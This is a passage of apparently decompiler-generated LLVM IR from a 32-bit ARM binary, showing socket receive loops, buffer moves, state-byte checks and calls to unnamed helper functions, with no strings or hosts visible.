  %v3_a190 = load i32, i32* %v2_a190, align 4
  store i32 %v3_a190, i32* %r1.global-to-local, align 4
  %v1_a194 = add i32 %v0_a190, -1456
  %v2_a194 = inttoptr i32 %v1_a194 to i32*
  %v3_a194 = load i32, i32* %v2_a194, align 4
  store i32 %v3_a194, i32* %r0.global-to-local, align 4
  %v1_a198 = sub i32 1024, %v3_a190
  store i32 %v1_a198, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_a1a0 = load i32, i32* @r7, align 4
  %v2_a1a0 = add i32 %v0_a1a0, %v3_a190
  store i32 %v2_a1a0, i32* %r1.global-to-local, align 4
  %v4_a1a4 = call i32 @_recv(i32 %v3_a194, i32 %v2_a1a0, i32 %v1_a198, i32 16384)
  store i32 %v4_a1a4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a1a8 = icmp slt i32 %v4_a1a4, 0
  store i1 %v1_a1a8, i1* %cpsr_n.global-to-local, align 1
  %v2_a1a8 = icmp eq i32 %v4_a1a4, 0
  store i1 %v2_a1a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a1a8, label %dec_label_pc_a684, label %dec_label_pc_a1b0

dec_label_pc_a1b0:                                ; preds = %dec_label_pc_a188
  %v1_a1b0 = add i32 %v4_a1a4, 1
  %v2_a1b0 = icmp eq i32 %v4_a1a4, -1
  store i1 %v2_a1b0, i1* %cpsr_c.global-to-local, align 1
  %v3_a1b0 = sub i32 0, %v4_a1a4
  %v4_a1b0 = and i32 %v1_a1b0, %v3_a1b0
  %v5_a1b0 = icmp slt i32 %v4_a1b0, 0
  store i1 %v5_a1b0, i1* %cpsr_v.global-to-local, align 1
  %v6_a1b0 = icmp slt i32 %v1_a1b0, 0
  store i1 %v6_a1b0, i1* %cpsr_n.global-to-local, align 1
  %v7_a1b0 = icmp eq i32 %v1_a1b0, 0
  store i1 %v7_a1b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a1b0, label %dec_label_pc_a6a8, label %dec_label_pc_a1b8

dec_label_pc_a1b8:                                ; preds = %dec_label_pc_a1b0
  %v0_a1b8 = load i32, i32* @r8, align 4
  %v1_a1b8 = add i32 %v0_a1b8, 656
  %v2_a1b8 = inttoptr i32 %v1_a1b8 to i32*
  %v3_a1b8 = load i32, i32* %v2_a1b8, align 4
  store i32 %v1_9530, i32* %r1.global-to-local, align 4
  %v2_a1c0 = add i32 %v3_a1b8, %v4_a1a4
  store i32 %v2_a1c0, i32* @r4, align 4
  store i32 %v2_a1c0, i32* %v2_a1b8, align 4
  %v0_a1c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_a1c8 = load i32, i32* @r8, align 4
  %v2_a1c8 = add i32 %v1_a1c8, -1448
  %v3_a1c8 = inttoptr i32 %v2_a1c8 to i32*
  store i32 %v0_a1c8, i32* %v3_a1c8, align 4
  br label %dec_label_pc_a254

dec_label_pc_a1d0:                                ; preds = %dec_label_pc_a254
  %v1_a1d0 = add i32 %v0_a254, -4
  %v2_a1d0 = inttoptr i32 %v1_a1d0 to i32*
  %v3_a1d0 = load i32, i32* %v2_a1d0, align 4
  store i32 %v3_a1d0, i32* @sl, align 4
  %v1_a1d4 = load i32, i32* @r4, align 4
  %v5_a1d8 = icmp slt i32 %v3_a254, %v1_a1d4
  %storemerge73 = select i1 %v5_a1d8, i32 %v3_a254, i32 %v1_a1d4
  store i32 %storemerge73, i32* @r5, align 4
  %v2_a1e0 = sub i32 %v3_a254, %storemerge73
  store i32 %v2_a1e0, i32* @r6, align 4
  %v1_a1e4 = add i32 %v3_a1d0, -1
  %v2_a1e4 = icmp ne i32 %v3_a1d0, 0
  store i1 %v2_a1e4, i1* %cpsr_c.global-to-local, align 1
  %v3_a1e4 = sub i32 0, %v3_a1d0
  %v4_a1e4 = and i32 %v3_a1d0, %v3_a1e4
  %v5_a1e4 = icmp slt i32 %v4_a1e4, 0
  store i1 %v5_a1e4, i1* %cpsr_v.global-to-local, align 1
  %v6_a1e4 = icmp slt i32 %v1_a1e4, 0
  store i1 %v6_a1e4, i1* %cpsr_n.global-to-local, align 1
  %v7_a1e4 = icmp eq i32 %v3_a1d0, 1
  store i1 %v7_a1e4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_a1e0, i32* %v2_a254, align 4
  br i1 %v7_a1e4, label %dec_label_pc_a2a0, label %dec_label_pc_a1d0.dec_label_pc_a1f0thread-pre-split_crit_edge

dec_label_pc_a1d0.dec_label_pc_a1f0thread-pre-split_crit_edge: ; preds = %dec_label_pc_a1d0
  %v0_a1f0.pr.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_a1f0

dec_label_pc_a1f0:                                ; preds = %dec_label_pc_a260, %dec_label_pc_a1d0.dec_label_pc_a1f0thread-pre-split_crit_edge, %dec_label_pc_a2c8
  %v0_a1f0 = phi i32 [ %v3_a2c8, %dec_label_pc_a2c8 ], [ %v0_a1f0.pr.pre, %dec_label_pc_a1d0.dec_label_pc_a1f0thread-pre-split_crit_edge ], [ %v3_a254, %dec_label_pc_a260 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a1f0 = icmp slt i32 %v0_a1f0, 0
  store i1 %v1_a1f0, i1* %cpsr_n.global-to-local, align 1
  %v2_a1f0 = icmp eq i32 %v0_a1f0, 0
  store i1 %v2_a1f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a1f0, label %dec_label_pc_a1f8, label %dec_label_pc_a218

dec_label_pc_a1f8:                                ; preds = %dec_label_pc_a1f0
  %v0_a1f8 = load i32, i32* @r8, align 4
  %v1_a1f8 = add i32 %v0_a1f8, 4
  %v2_a1f8 = inttoptr i32 %v1_a1f8 to i32*
  %v3_a1f8 = load i32, i32* %v2_a1f8, align 4
  store i32 %v3_a1f8, i32* @r4, align 4
  %v1_a1fc = add i32 %v3_a1f8, -1
  %v2_a1fc = icmp ne i32 %v3_a1f8, 0
  store i1 %v2_a1fc, i1* %cpsr_c.global-to-local, align 1
  %v3_a1fc = sub i32 0, %v3_a1f8
  %v4_a1fc = and i32 %v3_a1f8, %v3_a1fc
  %v5_a1fc = icmp slt i32 %v4_a1fc, 0
  store i1 %v5_a1fc, i1* %cpsr_v.global-to-local, align 1
  %v6_a1fc = icmp slt i32 %v1_a1fc, 0
  store i1 %v6_a1fc, i1* %cpsr_n.global-to-local, align 1
  %v7_a1fc = icmp eq i32 %v3_a1f8, 1
  store i1 %v7_a1fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a1fc, label %dec_label_pc_a2d0, label %dec_label_pc_a204

dec_label_pc_a204:                                ; preds = %dec_label_pc_a1f8
  %v1_a204 = add i32 %v0_a1f8, 656
  %v2_a204 = inttoptr i32 %v1_a204 to i32*
  %v3_a204 = load i32, i32* %v2_a204, align 4
  %v0_a208 = load i32, i32* @r5, align 4
  %v2_a208 = sub i32 %v3_a204, %v0_a208
  store i32 %v2_a208, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a20c = icmp slt i32 %v2_a208, 0
  store i1 %v1_a20c, i1* %cpsr_n.global-to-local, align 1
  %v2_a20c = icmp eq i32 %v2_a208, 0
  store i1 %v2_a20c, i1* %cpsr_z.global-to-local, align 1
  %v2_a210 = add i32 %v0_a1f8, 8
  %v3_a210 = inttoptr i32 %v2_a210 to i32*
  store i32 %v2_a208, i32* %v3_a210, align 4
  br i1 %v2_a20c, label %dec_label_pc_a158, label %dec_label_pc_a218

dec_label_pc_a218:                                ; preds = %dec_label_pc_a1f0, %dec_label_pc_a2d0, %dec_label_pc_a204, %dec_label_pc_a358
  %v0_a218 = load i32, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a218 = icmp slt i32 %v0_a218, 0
  store i1 %v1_a218, i1* %cpsr_n.global-to-local, align 1
  %v2_a218 = icmp eq i32 %v0_a218, 0
  store i1 %v2_a218, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a218, label %dec_label_pc_a268, label %dec_label_pc_a220

dec_label_pc_a220:                                ; preds = %dec_label_pc_a218
  %v0_a220 = load i32, i32* @r8, align 4
  %v1_a220 = add i32 %v0_a220, 656
  %v2_a220 = inttoptr i32 %v1_a220 to i32*
  %v3_a220 = load i32, i32* %v2_a220, align 4
  store i32 %v3_a220, i32* %r3.global-to-local, align 4
  %v2_a224 = sub i32 %v3_a220, %v0_a218
  store i32 %v2_a224, i32* %r4.global-to-local, align 4
  store i32 %v2_a224, i32* %r2.global-to-local, align 4
  store i32 %v2_a224, i32* %v2_a220, align 4
  %v0_a230 = load i32, i32* @r7, align 4
  %v1_a230 = load i32, i32* @r5, align 4
  %v2_a230 = add i32 %v1_a230, %v0_a230
  store i32 %v2_a230, i32* %r1.global-to-local, align 4
  store i32 %v0_a230, i32* %r0.global-to-local, align 4
  %v3_a238 = call i32 @_memmove(i32 %v0_a230, i32 %v2_a230, i32 %v2_a224)
  store i32 %v3_a238, i32* %r0.global-to-local, align 4
  %v0_a23c = load i32, i32* @r8, align 4
  %v1_a23c = add i32 %v0_a23c, 656
  %v2_a23c = inttoptr i32 %v1_a23c to i32*
  %v3_a23c = load i32, i32* %v2_a23c, align 4
  store i32 %v3_a23c, i32* @r4, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v1_a244 = load i32, i32* %sb.global-to-local, align 4
  %v2_a244 = add i32 %v1_a244, %v3_a23c
  store i32 %v2_a244, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a248 = icmp slt i32 %v3_a23c, 0
  store i1 %v1_a248, i1* %cpsr_n.global-to-local, align 1
  %v2_a248 = icmp eq i32 %v3_a23c, 0
  store i1 %v2_a248, i1* %cpsr_z.global-to-local, align 1
  %v3_a24c = add i32 %v2_a244, 2116
  %v4_a24c = inttoptr i32 %v3_a24c to i8*
  store i8 0, i8* %v4_a24c, align 1
  %v0_a250 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a250, label %dec_label_pc_a268, label %dec_label_pc_a254

dec_label_pc_a254:                                ; preds = %dec_label_pc_a220, %dec_label_pc_a1b8
  %v0_a254 = load i32, i32* @r8, align 4
  %v1_a254 = add i32 %v0_a254, 8
  %v2_a254 = inttoptr i32 %v1_a254 to i32*
  %v3_a254 = load i32, i32* %v2_a254, align 4
  store i32 %v3_a254, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a258 = icmp slt i32 %v3_a254, 0
  store i1 %v1_a258, i1* %cpsr_n.global-to-local, align 1
  %v2_a258 = icmp eq i32 %v3_a254, 0
  store i1 %v2_a258, i1* %cpsr_z.global-to-local, align 1
  %v5_a25c = icmp sgt i32 %v3_a254, 0
  br i1 %v5_a25c, label %dec_label_pc_a1d0, label %dec_label_pc_a260

dec_label_pc_a260:                                ; preds = %dec_label_pc_a254
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_a1f0

dec_label_pc_a268:                                ; preds = %dec_label_pc_a220, %dec_label_pc_a218
  %v0_a268 = load i32, i32* @r8, align 4
  %v1_a268 = add i32 %v0_a268, -1452
  %v2_a268 = inttoptr i32 %v1_a268 to i8*
  %v3_a268 = load i8, i8* %v2_a268, align 1
  %v4_a268 = zext i8 %v3_a268 to i32
  store i32 %v4_a268, i32* %r3.global-to-local, align 4
  %v2_a26c = icmp ugt i8 %v3_a268, 6
  store i1 %v2_a26c, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a26c = icmp ult i8 %v3_a268, 7
  store i1 %v6_a26c, i1* %cpsr_n.global-to-local, align 1
  %v7_a26c = icmp eq i8 %v3_a268, 7
  store i1 %v7_a26c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a26c, label %dec_label_pc_a274, label %dec_label_pc_9590

dec_label_pc_a274:                                ; preds = %dec_label_pc_a268
  %v1_a274 = add i32 %v0_a268, 656
  %v2_a274 = inttoptr i32 %v1_a274 to i32*
  %v3_a274 = load i32, i32* %v2_a274, align 4
  store i32 %v3_a274, i32* %r3.global-to-local, align 4
  %v1_a278 = add i32 %v3_a274, -1024
  %v2_a278 = icmp ugt i32 %v3_a274, 1023
  store i1 %v2_a278, i1* %cpsr_c.global-to-local, align 1
  %v3_a278 = sub i32 1023, %v3_a274
  %v4_a278 = and i32 %v3_a278, %v3_a274
  %v5_a278 = icmp slt i32 %v4_a278, 0
  store i1 %v5_a278, i1* %cpsr_v.global-to-local, align 1
  %v6_a278 = icmp slt i32 %v1_a278, 0
  store i1 %v6_a278, i1* %cpsr_n.global-to-local, align 1
  %v7_a278 = icmp eq i32 %v3_a274, 1024
  store i1 %v7_a278, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a278, label %dec_label_pc_a280.loopexit, label %dec_label_pc_a188

dec_label_pc_a280.loopexit:                       ; preds = %dec_label_pc_a274
  %v0_a280.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_a280

dec_label_pc_a280:                                ; preds = %dec_label_pc_a280.loopexit, %dec_label_pc_a164
  %v0_a280 = phi i32 [ %v0_a280.pre, %dec_label_pc_a280.loopexit ], [ %v1_a180, %dec_label_pc_a164 ]
  store i32 %v0_a280, i32* %r0.global-to-local, align 4
  %v1_a284 = add i32 %v0_a280, 64
  store i32 %v1_a284, i32* %r1.global-to-local, align 4
  store i32 960, i32* %r2.global-to-local, align 4
  %v3_a28c = call i32 @_memmove(i32 %v0_a280, i32 %v1_a284, i32 960)
  store i32 %v3_a28c, i32* %r0.global-to-local, align 4
  %v0_a290 = load i32, i32* @r8, align 4
  %v1_a290 = add i32 %v0_a290, 656
  %v2_a290 = inttoptr i32 %v1_a290 to i32*
  %v3_a290 = load i32, i32* %v2_a290, align 4
  store i32 %v3_a290, i32* %r3.global-to-local, align 4
  %v1_a294 = add i32 %v3_a290, -64
  store i32 %v1_a294, i32* @r4, align 4
  store i32 %v1_a294, i32* %v2_a290, align 4
  br label %dec_label_pc_a188

dec_label_pc_a2a0:                                ; preds = %dec_label_pc_a1d0
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 36, i32* %r0.global-to-local, align 4
  %v3_a2a8 = call i32 @function_13c04(i32 36, i32* null)
  %v0_a2ac = load i32, i32* @r4, align 4
  store i32 %v0_a2ac, i32* %r1.global-to-local, align 4
  store i32 %v3_a2a8, i32* %r2.global-to-local, align 4
  store i32 11, i32* %r3.global-to-local, align 4
  %v0_a2b8 = load i32, i32* @r7, align 4
  store i32 %v0_a2b8, i32* %r0.global-to-local, align 4
  %v4_a2bc = call i32 @function_146d0(i32 %v0_a2b8, i32 %v0_a2ac, i32 %v3_a2a8, i32 11)
  store i32 %v4_a2bc, i32* %r0.global-to-local, align 4
  %v2_a2c0 = add i32 %v4_a2bc, 1
  %v3_a2c0 = icmp eq i32 %v4_a2bc, -1
  store i1 %v3_a2c0, i1* %cpsr_c.global-to-local, align 1
  %v4_a2c0 = sub i32 0, %v4_a2bc
  %v5_a2c0 = and i32 %v2_a2c0, %v4_a2c0
  %v6_a2c0 = icmp slt i32 %v5_a2c0, 0
  store i1 %v6_a2c0, i1* %cpsr_v.global-to-local, align 1
  %v7_a2c0 = icmp slt i32 %v2_a2c0, 0
  store i1 %v7_a2c0, i1* %cpsr_n.global-to-local, align 1
  %v8_a2c0 = icmp eq i32 %v2_a2c0, 0
  store i1 %v8_a2c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_a2c0, label %dec_label_pc_a2c8, label %dec_label_pc_a82c

dec_label_pc_a2c8:                                ; preds = %dec_label_pc_a2a0
  %v0_a2c8 = load i32, i32* @r8, align 4
  %v1_a2c8 = add i32 %v0_a2c8, 8
  %v2_a2c8 = inttoptr i32 %v1_a2c8 to i32*
  %v3_a2c8 = load i32, i32* %v2_a2c8, align 4
  store i32 %v3_a2c8, i32* @r6, align 4
  br label %dec_label_pc_a1f0

dec_label_pc_a2d0:                                ; preds = %dec_label_pc_a1f8
  %v0_a2d0 = load i32, i32* @r7, align 4
  store i32 %v0_a2d0, i32* %r0.global-to-local, align 4
  %v1_a2d4 = add i32 %v0_a1f8, 656
  %v2_a2d4 = inttoptr i32 %v1_a2d4 to i32*
  %v3_a2d4 = load i32, i32* %v2_a2d4, align 4
  store i32 %v3_a2d4, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_a2e0 = call i32 @function_146d0(i32 %v0_a2d0, i32 %v3_a2d4, i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32), i32 2)
  store i32 %v5_a2e0, i32* %r0.global-to-local, align 4
  %v1_a2e4 = add i32 %v5_a2e0, 1
  %v2_a2e4 = icmp eq i32 %v5_a2e0, -1
  store i1 %v2_a2e4, i1* %cpsr_c.global-to-local, align 1
  %v3_a2e4 = sub i32 0, %v5_a2e0
  %v4_a2e4 = and i32 %v1_a2e4, %v3_a2e4
  %v5_a2e4 = icmp slt i32 %v4_a2e4, 0
  store i1 %v5_a2e4, i1* %cpsr_v.global-to-local, align 1
  %v6_a2e4 = icmp slt i32 %v1_a2e4, 0
  store i1 %v6_a2e4, i1* %cpsr_n.global-to-local, align 1
  %v7_a2e4 = icmp eq i32 %v1_a2e4, 0
  store i1 %v7_a2e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a2e4, label %dec_label_pc_a218, label %dec_label_pc_a2ec

dec_label_pc_a2ec:                                ; preds = %dec_label_pc_a2d0
  %v0_a2ec = load i32, i32* @r8, align 4
  %v1_a2ec = add i32 %v0_a2ec, 656
  %v2_a2ec = inttoptr i32 %v1_a2ec to i32*
  %v3_a2ec = load i32, i32* %v2_a2ec, align 4
  store i32 %v3_a2ec, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v0_a2f8 = load i32, i32* @r7, align 4
  store i32 %v0_a2f8, i32* %r0.global-to-local, align 4
  %v5_a2fc = call i32 @function_146d0(i32 %v0_a2f8, i32 %v3_a2ec, i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32), i32 2)
  %v1_a300 = load i32, i32* %sb.global-to-local, align 4
  %v2_a300 = add i32 %v1_a300, %v5_a2fc
  store i32 %v2_a300, i32* %ip.global-to-local, align 4
  store i32 %v5_a2fc, i32* @r5, align 4
  store i32 %v5_a2fc, i32* %r1.global-to-local, align 4
  %v0_a30c = load i32, i32* @r7, align 4
  store i32 %v0_a30c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14f8c.96 to i32), i32* %r2.global-to-local, align 4
  %v0_a314 = load i32, i32* @r4, align 4
  store i32 %v0_a314, i32* %r3.global-to-local, align 4
  %v0_a318 = load i32, i32* @r6, align 4
  %v1_a318 = trunc i32 %v0_a318 to i8
  %v3_a318 = add i32 %v2_a300, 2114
  %v4_a318 = inttoptr i32 %v3_a318 to i8*
  store i8 %v1_a318, i8* %v4_a318, align 1
  %v4_a31c = call i32 @function_146d0(i32 %v0_a30c, i32 %v5_a2fc, i32 ptrtoint (i32* @global_var_14f8c.96 to i32), i32 %v0_a314)
  store i32 %v4_a31c, i32* %r0.global-to-local, align 4
  %v1_a320 = add i32 %v4_a31c, 1
  %v2_a320 = icmp eq i32 %v4_a31c, -1
  store i1 %v2_a320, i1* %cpsr_c.global-to-local, align 1
  %v3_a320 = sub i32 0, %v4_a31c
  %v4_a320 = and i32 %v1_a320, %v3_a320
  %v5_a320 = icmp slt i32 %v4_a320, 0
  store i1 %v5_a320, i1* %cpsr_v.global-to-local, align 1
  %v6_a320 = icmp slt i32 %v1_a320, 0
  store i1 %v6_a320, i1* %cpsr_n.global-to-local, align 1
  %v7_a320 = icmp eq i32 %v1_a320, 0
  store i1 %v7_a320, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a320, label %dec_label_pc_a344, label %dec_label_pc_a328

dec_label_pc_a328:                                ; preds = %dec_label_pc_a2ec
  %v0_a328 = load i32, i32* @r7, align 4
  store i32 %v0_a328, i32* %r0.global-to-local, align 4
  %v0_a32c = load i32, i32* @r5, align 4
  store i32 %v0_a32c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14f8c.96 to i32), i32* %r2.global-to-local, align 4
  %v0_a334 = load i32, i32* @r4, align 4
  store i32 %v0_a334, i32* %r3.global-to-local, align 4
  %v4_a338 = call i32 @function_146d0(i32 %v0_a328, i32 %v0_a32c, i32 ptrtoint (i32* @global_var_14f8c.96 to i32), i32 %v0_a334)
  %v1_a33c = load i32, i32* %sb.global-to-local, align 4
  %v2_a33c = add i32 %v1_a33c, %v4_a338
  store i32 %v2_a33c, i32* %r0.global-to-local, align 4
  %v0_a340 = load i32, i32* @r6, align 4
  %v1_a340 = trunc i32 %v0_a340 to i8
  %v3_a340 = add i32 %v2_a33c, 2116
  %v4_a340 = inttoptr i32 %v3_a340 to i8*
  store i8 %v1_a340, i8* %v4_a340, align 1
  br label %dec_label_pc_a344

dec_label_pc_a344:                                ; preds = %dec_label_pc_a2ec, %dec_label_pc_a328
  %v0_a344 = load i32, i32* @r7, align 4
  store i32 %v0_a344, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  %v2_a34c = inttoptr i32 %v0_a344 to i8*
  %v3_a34c = call i32 @function_14738(i8* %v2_a34c, i32 16)
  store i32 %v3_a34c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a350 = icmp slt i32 %v3_a34c, 0
  store i1 %v1_a350, i1* %cpsr_n.global-to-local, align 1
  %v2_a350 = icmp eq i32 %v3_a34c, 0
  store i1 %v2_a350, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a350, label %dec_label_pc_aadc, label %dec_label_pc_a358

dec_label_pc_a358:                                ; preds = %dec_label_pc_a344
  %v1_a358 = add i32 %v3_a34c, 2
  store i32 %v1_a358, i32* %r6.global-to-local, align 4
  %v1_a35c = load i32, i32* @r8, align 4
  %v2_a35c = add i32 %v1_a35c, 8
  %v3_a35c = inttoptr i32 %v2_a35c to i32*
  store i32 %v1_a358, i32* %v3_a35c, align 4
  br label %dec_label_pc_a218

dec_label_pc_a364:                                ; preds = %dec_label_pc_9a0c
  %v0_a364 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_a364, i32* %r1.global-to-local, align 4
  %v0_a368 = load i32, i32* @r6, align 4
  store i32 %v0_a368, i32* @r0, align 4
  %v2_a36c = inttoptr i32 %v0_a368 to i8*
  %v3_a36c = call i32 @function_14634(i8* %v2_a36c, i32 %v0_a364)
  store i32 %v3_a36c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9a24

dec_label_pc_a374:                                ; preds = %dec_label_pc_9588
  %v0_a374 = call i32 @___errno_location()
  store i32 %v0_a374, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v0_a374, i32* @r4, align 4
  br label %dec_label_pc_a380

dec_label_pc_a380:                                ; preds = %dec_label_pc_a3a0.dec_label_pc_a380_crit_edge, %dec_label_pc_a374
  %v1_a380 = phi i32 [ %v1_a380.pre, %dec_label_pc_a3a0.dec_label_pc_a380_crit_edge ], [ %v0_a374, %dec_label_pc_a374 ]
  %v0_a380 = phi i32 [ %v0_a380.pre, %dec_label_pc_a3a0.dec_label_pc_a380_crit_edge ], [ 0, %dec_label_pc_a374 ]
  %v2_a380 = inttoptr i32 %v1_a380 to i32*
  store i32 %v0_a380, i32* %v2_a380, align 4
  store i32 %v2_8fd8, i32* %r1.global-to-local, align 4
  %v0_a388 = load i32, i32* @r8, align 4
  %v1_a388 = add i32 %v0_a388, -1456
  %v2_a388 = inttoptr i32 %v1_a388 to i32*
  %v3_a388 = load i32, i32* %v2_a388, align 4
  store i32 %v3_a388, i32* %r0.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_a394 = call i32 @_recv(i32 %v3_a388, i32 %v2_8fd8, i32 10240, i32 16384)
  store i32 %v4_a394, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a398 = icmp slt i32 %v4_a394, 0
  store i1 %v1_a398, i1* %cpsr_n.global-to-local, align 1
  %v2_a398 = icmp eq i32 %v4_a394, 0
  store i1 %v2_a398, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a398, label %dec_label_pc_a678, label %dec_label_pc_a3a0

dec_label_pc_a3a0:                                ; preds = %dec_label_pc_a380
  %v2_a3a0 = add i32 %v4_a394, 1
  %v3_a3a0 = icmp eq i32 %v4_a394, -1
  store i1 %v3_a3a0, i1* %cpsr_c.global-to-local, align 1
  %v4_a3a0 = sub i32 0, %v4_a394
  %v5_a3a0 = and i32 %v2_a3a0, %v4_a3a0
  %v6_a3a0 = icmp slt i32 %v5_a3a0, 0
  store i1 %v6_a3a0, i1* %cpsr_v.global-to-local, align 1
  %v7_a3a0 = icmp slt i32 %v2_a3a0, 0
  store i1 %v7_a3a0, i1* %cpsr_n.global-to-local, align 1
  %v8_a3a0 = icmp eq i32 %v2_a3a0, 0
  store i1 %v8_a3a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_a3a0, label %dec_label_pc_a3a8, label %dec_label_pc_a3a0.dec_label_pc_a380_crit_edge

dec_label_pc_a3a0.dec_label_pc_a380_crit_edge:    ; preds = %dec_label_pc_a3a0
  %v0_a380.pre = load i32, i32* @r5, align 4
  %v1_a380.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_a380

dec_label_pc_a3a8:                                ; preds = %dec_label_pc_a3a0
  %v0_a3a8 = load i32, i32* @r4, align 4
  %v1_a3a8 = inttoptr i32 %v0_a3a8 to i32*
  %v2_a3a8 = load i32, i32* %v1_a3a8, align 4
  store i32 %v2_a3a8, i32* %r3.global-to-local, align 4
  %v1_a3ac = add i32 %v2_a3a8, -11
  %v2_a3ac = icmp ugt i32 %v2_a3a8, 10
  store i1 %v2_a3ac, i1* %cpsr_c.global-to-local, align 1
  %v3_a3ac = sub i32 10, %v2_a3a8
  %v4_a3ac = and i32 %v3_a3ac, %v2_a3a8
  %v5_a3ac = icmp slt i32 %v4_a3ac, 0
  store i1 %v5_a3ac, i1* %cpsr_v.global-to-local, align 1
  %v6_a3ac = icmp slt i32 %v1_a3ac, 0
  store i1 %v6_a3ac, i1* %cpsr_n.global-to-local, align 1
  %v7_a3ac = icmp eq i32 %v2_a3a8, 11
  store i1 %v7_a3ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a3ac, label %dec_label_pc_a7f0, label %dec_label_pc_a3b4

dec_label_pc_a3b4:                                ; preds = %dec_label_pc_a3a8, %dec_label_pc_a678
  %v0_a3b4 = load i32, i32* @r8, align 4
  %v1_a3b4 = add i32 %v0_a3b4, -1456
  %v2_a3b4 = inttoptr i32 %v1_a3b4 to i32*
  %v3_a3b4 = load i32, i32* %v2_a3b4, align 4
  store i32 %v3_a3b4, i32* %r0.global-to-local, align 4
  %v1_a3b8 = call i32 @_close(i32 %v3_a3b4)
  store i32 %v1_a3b8, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_a3c4 = load i32, i32* @r8, align 4
  %v2_a3c4 = add i32 %v1_a3c4, -1456
  %v3_a3c4 = inttoptr i32 %v2_a3c4 to i32*
  store i32 -1, i32* %v3_a3c4, align 4
  %v0_a3c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_a3c8 = trunc i32 %v0_a3c8 to i8
  %v2_a3c8 = load i32, i32* @r8, align 4
  %v3_a3c8 = add i32 %v2_a3c8, -1452
  %v4_a3c8 = inttoptr i32 %v3_a3c8 to i8*
  store i8 %v1_a3c8, i8* %v4_a3c8, align 1
  br label %dec_label_pc_9590

dec_label_pc_a3d0:                                ; preds = %dec_label_pc_a080, %dec_label_pc_a0a4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 37, i32* %r0.global-to-local, align 4
  %v3_a3d8 = call i32 @function_13c04(i32 37, i32* null)
  %v0_a3dc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_a3dc, i32* @r1, align 4
  store i32 %v3_a3d8, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_a3e8 = call i32 @function_14960(i8* %tmp199, i32 %v0_a3dc, i32 %v3_a3d8)
  store i32 %v4_a3e8, i32* %r0.global-to-local, align 4
  %v1_a3f0 = add i32 %v4_a3e8, 1
  %v2_a3f0 = icmp eq i32 %v4_a3e8, -1
  store i1 %v2_a3f0, i1* %cpsr_c.global-to-local, align 1
  %v3_a3f0 = sub i32 0, %v4_a3e8
  %v4_a3f0 = and i32 %v1_a3f0, %v3_a3f0
  %v5_a3f0 = icmp slt i32 %v4_a3f0, 0
  store i1 %v5_a3f0, i1* %cpsr_v.global-to-local, align 1
  %v6_a3f0 = icmp slt i32 %v1_a3f0, 0
